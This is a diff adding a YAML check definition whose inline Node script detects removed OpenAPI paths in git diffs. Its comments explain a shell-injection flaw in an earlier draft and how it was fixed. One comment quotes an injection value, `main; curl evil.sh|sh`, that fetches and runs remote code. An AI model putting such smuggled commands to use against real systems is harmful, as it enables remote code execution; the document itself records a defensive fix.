@@ -1,0 +1,58 @@
+# checks/api-breaking-change.check.yaml -- module.yaml's own worked example in 19 §19.1
+# (checks: [ contract:verify, api:breaking-change ]) -- built to match that exact id. In
+# @forge/engine/gates' own real DeterministicCheck shape, plus the `remedy` string 19 §19.6 requires.
+#
+# `run` is the same "dependency-free inline script" choice contract-verify.check.yaml documents. It
+# uses real `git diff` (git is always present in a FORGE project -- 15 §15.11's own overlay-channel
+# table and every gate content in this codebase already assume a real git repository) against a
+# caller-configurable base ref (`FORGE_BASE_REF`, default `HEAD` -- the same "compare against a base
+# the caller names" convention a real CI breaking-change gate needs, since "breaking relative to what"
+# is never a fixed answer this module can hard-code) restricted to docs/forge/specs/interfaces/, and
+# scans the diff for a removed OpenAPI path/method key (a line matching a YAML mapping key shaped like
+# a URL path or an HTTP method) that has no exactly-matching added line anywhere else in the same diff
+# -- the mechanically-detectable proxy for "a consumer-visible operation disappeared" this check exists
+# to catch. A path/method that was merely reordered or whose sibling fields changed produces a
+# removed+added pair with identical key text and is correctly not flagged; a genuinely removed or
+# renamed path/method has no matching added counterpart and is. Prints {"removedOperations": N} -- see
+# test/fm-service-checks.test.ts for the real pass/fail fixture runs (built against a real, temporary
+# git repository, not a stub), including the exact renamed-vs-removed distinction above.
+#
+# Disclosed, accepted limitation of the "identical removed+added text nets to zero" heuristic (a
+# critic round confirmed this rather than treating it as an oversight): a path rename that keeps an
+# unrelated child key's own text identical (e.g. `/orders` becomes `/orders/all`, both still with a
+# bare `get:` child line) reports 0, since the `get:` line itself was never removed. This is a real,
+# consumer-visible breaking change a text-line diff proxy cannot distinguish from an untouched
+# sibling method without parsing the surrounding YAML structure, which this dependency-free script
+# deliberately does not do (see contract-verify.check.yaml's own identical "no dependency this module
+# has no basis to install" reasoning). Left as a known false negative of a mechanically-detectable
+# proxy, not a fabricated fix that would need a real YAML/OpenAPI diff library this module cannot
+# take a dependency on.
+#
+# A critic round found the first draft of this script built its own `git diff ${baseRef} -- ...`
+# command as a template-literal string and ran it through `execSync` -- `execSync` always spawns a
+# real shell (`/bin/sh -c`) even with no explicit `shell` option, so a hostile `FORGE_BASE_REF` (a
+# value real CI systems routinely seed from an attacker-influenced ref/branch name, mirroring
+# `GITHUB_BASE_REF`) like `main; curl evil.sh|sh` achieved real command execution, not merely a
+# malformed `git diff` invocation -- a real, reachable shell-injection defect this piece's own first
+# draft introduced, not one inherited from an existing precedent. Fixed two ways, neither alone
+# trusted as sufficient: (1) `FORGE_BASE_REF` is validated against a real ref-name allowlist pattern
+# before use, falling back to `HEAD` outright for anything that does not match (closing both shell
+# metacharacters and a leading `-` that could otherwise be read as a `git` flag); (2) the git
+# invocation itself now uses `execFileSync` with a real argv array (`["diff", baseRef, "--",
+# "docs/forge/specs/interfaces"]`), which never spawns a shell at all regardless of `baseRef`'s own
+# content. test/fm-service-checks.test.ts pins a real hostile `FORGE_BASE_REF` fixture directly.
+id: api:breaking-change
+name: API breaking-change detector
+description: >
+  Diffs docs/forge/specs/interfaces/ against FORGE_BASE_REF (default HEAD) and fails if any OpenAPI
+  path or HTTP method key was removed with no matching addition elsewhere in the same diff.
+run: 'node -e ''const {execFileSync}=require("node:child_process");const rawRef=process.env.FORGE_BASE_REF||"HEAD";const baseRef=/^[A-Za-z0-9][A-Za-z0-9._\/-]*$/.test(rawRef)?rawRef:"HEAD";let diff="";try{diff=execFileSync("git",["diff",baseRef,"--","docs/forge/specs/interfaces"],{encoding:"utf8"});}catch(e){diff="";}const keyPattern=/^[+-]\s*"?(\/[\w{}\/-]*|get|post|put|delete|patch|options|head)"?\s*:/i;const removed=[];const added=new Set();for(const line of diff.split("\n")){if(line.startsWith("+++")||line.startsWith("---"))continue;if(!keyPattern.test(line))continue;const text=line.slice(1).trim();if(line[0]==="+")added.add(text);else if(line[0]==="-")removed.push(text);}const removedOperations=removed.filter((t)=>!added.has(t)).length;console.log(JSON.stringify({removedOperations}));'''
+parser: json
+failOn: 'removedOperations > 0'
+remedy: >
+  Re-run the command above locally (set FORGE_BASE_REF to the branch or tag you are comparing against)
+  and read the printed count, then open the diff yourself: for every removed path or method with no
+  matching addition, either restore it, add a new versioned path/method alongside it rather than
+  replacing it in place, or -- if this really is a deliberate, reviewed breaking change -- record a
+  waiver naming the removed operation and the migration plan for its consumers rather than silencing
+  this check.
